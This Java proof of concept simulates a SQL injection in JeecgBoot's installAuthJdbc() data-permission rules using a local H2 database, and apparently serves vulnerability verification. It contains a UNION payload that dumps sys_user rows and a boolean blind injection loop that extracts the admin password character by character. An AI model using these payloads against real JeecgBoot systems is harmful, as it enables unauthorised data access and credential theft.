import java.sql.*;

/**
 * JeecgBoot QueryGenerator.installAuthJdbc() SQL注入 PoC
 * 
 * 模拟环境: H2 内存数据库
 * 验证目标: 证明通过 sys_permission_data_rule 表中的 ruleValue 可注入任意 SQL
 * 
 * 编译运行:
 *   javac VerifySQLi.java
 *   java -cp .:h2-2.2.224.jar VerifySQLi
 * 
 * 或直接用 Maven 引入 H2 后运行
 */
public class VerifySQLi {

    private static final String DB_URL = "jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1";
    private static final String DB_USER = "sa";
    private static final String DB_PASS = "";

    public static void main(String[] args) throws Exception {
        Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
        Statement stmt = conn.createStatement();

        System.out.println("============================================================");
        System.out.println("JeecgBoot installAuthJdbc() SQL注入 PoC");
        System.out.println("============================================================");
        System.out.println();

        // 1. 初始化数据库表结构
        setupDatabase(stmt);

        // 2. 验证正常查询
        System.out.println("[*] 正常查询 (无注入):");
        System.out.println("    SQL: SELECT * FROM demo WHERE 1=1");
        normalQuery(conn);
        System.out.println();

        // 3. 验证 UNION 注入
        System.out.println("[*] 攻击1: UNION 跨表窃取 sys_user 数据");
        unionInjection(conn);
        System.out.println();

        // 4. 验证布尔盲注
        System.out.println("[*] 攻击2: 布尔盲注猜解 admin 密码");
        booleanBlindInjection(conn);
        System.out.println();

        System.out.println("============================================================");
        System.out.println("[+] PoC 验证完成: 两种注入方式均成功");
        System.out.println("============================================================");

        stmt.close();
        conn.close();
    }

    /**
     * 模拟 JeecgBoot 数据库结构
     */
    private static void setupDatabase(Statement stmt) throws SQLException {
        System.out.println("[*] 初始化模拟数据库...");

        // demo 表 (业务表，installAuthJdbc 查询目标)
        stmt.execute("CREATE TABLE demo (id VARCHAR(32), name VARCHAR(100), age INT)");
        stmt.execute("INSERT INTO demo VALUES ('d1', '测试数据A', 25)");
        stmt.execute("INSERT INTO demo VALUES ('d2', '测试数据B', 30)");

        // sys_user 表 (敏感数据，攻击目标)
        stmt.execute("CREATE TABLE sys_user (id VARCHAR(32), username VARCHAR(100), password VARCHAR(200))");
        stmt.execute("INSERT INTO sys_user VALUES ('1', 'admin', 'admin123')");
        stmt.execute("INSERT INTO sys_user VALUES ('2', 'jeecg', 'jeecg@2026')");

        // sys_permission_data_rule 表 (攻击者写入恶意规则的位置)
        stmt.execute("CREATE TABLE sys_permission_data_rule ("
                + "id VARCHAR(32), "
                + "rule_column VARCHAR(100), "
                + "rule_conditions VARCHAR(50), "
                + "rule_value VARCHAR(500))");

        System.out.println("    demo 表: 2条记录");
        System.out.println("    sys_user 表: admin/admin123, jeecg/jeecg@2026");
        System.out.println("    sys_permission_data_rule 表: 已创建");
        System.out.println();
    }

    /**
     * 正常查询 (无注入)
     */
    private static void normalQuery(Connection conn) throws SQLException {
        String sql = "SELECT * FROM demo WHERE 1=1";
        ResultSet rs = conn.createStatement().executeQuery(sql);
        while (rs.next()) {
            System.out.println("    结果: id=" + rs.getString("id")
                    + " name=" + rs.getString("name")
                    + " age=" + rs.getInt("age"));
        }
        rs.close();
    }

    /**
     * 模拟 installAuthJdbc() 的漏洞代码路径:
     *   sb.append(sqlAnd + getSqlRuleValue(ruleMap.get(c).getRuleValue()));
     * 
     * 最终拼接到:
     *   select * from demo where 1=1 ${permissionSql}
     */
    private static String simulateInstallAuthJdbc(String ruleValue) {
        // 模拟 getSqlRuleValue() — 仅做变量替换，无过滤
        String sqlRule = ruleValue;
        // 模拟 sb.append(sqlAnd + getSqlRuleValue(...))
        String permissionSql = " and " + sqlRule;
        return permissionSql;
    }

    /**
     * 攻击1: UNION 注入
     * 
     * 攻击者在"数据权限规则"中配置:
     *   规则类型: SQL_RULES_COLUMN
     *   ruleValue: 1=2 UNION SELECT id, username, id FROM sys_user WHERE 1=1 OR 1=1
     */
    private static void unionInjection(Connection conn) throws SQLException {
        String maliciousRuleValue = "1=2 UNION SELECT id, username, id FROM sys_user WHERE 1=1 OR 1=1";

        System.out.println("    ruleValue: " + maliciousRuleValue);

        // 模拟 installAuthJdbc() 处理
        String permissionSql = simulateInstallAuthJdbc(maliciousRuleValue);

        // 模拟 JeecgDemoMapper.xml: select * from demo where 1=1 ${permissionSql}
        String finalSql = "SELECT * FROM demo WHERE 1=1" + permissionSql;
        System.out.println("    最终SQL: " + finalSql);
        System.out.println();

        // 执行
        ResultSet rs = conn.createStatement().executeQuery(finalSql);
        System.out.println("    [!] 注入结果 (本应只返回 demo 表数据，实际返回了 sys_user 数据):");
        while (rs.next()) {
            System.out.println("    --> id=" + rs.getString(1)
                    + " name=" + rs.getString(2)
                    + " age=" + rs.getString(3));
        }
        rs.close();

        System.out.println("    [+] UNION注入成功: 跨表窃取了 sys_user 的 username");
    }

    /**
     * 攻击2: 布尔盲注
     * 
     * 攻击者在"数据权限规则"中配置:
     *   规则类型: SQL_RULES_COLUMN
     *   ruleValue: 1=1 AND SUBSTRING((SELECT password FROM sys_user WHERE username='admin'),{pos},1)='{char}'
     * 
     * 逐字符猜解 admin 密码
     */
    private static void booleanBlindInjection(Connection conn) throws SQLException {
        String targetUser = "admin";
        StringBuilder extractedPassword = new StringBuilder();
        String charset = "abcdefghijklmnopqrstuvwxyz0123456789@#$%&!_";

        System.out.println("    目标: 猜解 username='" + targetUser + "' 的密码");
        System.out.println("    方法: 逐字符布尔盲注 (有数据返回=猜对, 无数据=猜错)");
        System.out.println();

        for (int pos = 1; pos <= 20; pos++) {
            boolean found = false;
            for (char c : charset.toCharArray()) {
                String maliciousRuleValue = "1=1 AND SUBSTRING("
                        + "(SELECT password FROM sys_user WHERE username='" + targetUser + "')"
                        + "," + pos + ",1)='" + c + "'";

                String permissionSql = simulateInstallAuthJdbc(maliciousRuleValue);
                String finalSql = "SELECT * FROM demo WHERE 1=1" + permissionSql;

                ResultSet rs = conn.createStatement().executeQuery(finalSql);
                if (rs.next()) {
                    extractedPassword.append(c);
                    found = true;
                    rs.close();
                    break;
                }
                rs.close();
            }
            if (!found) {
                break;
            }
        }

        System.out.println("    [!] 猜解结果: " + targetUser + " 的密码 = " + extractedPassword.toString());
        System.out.println("    [+] 布尔盲注成功: 完整密码已提取");
    }
}
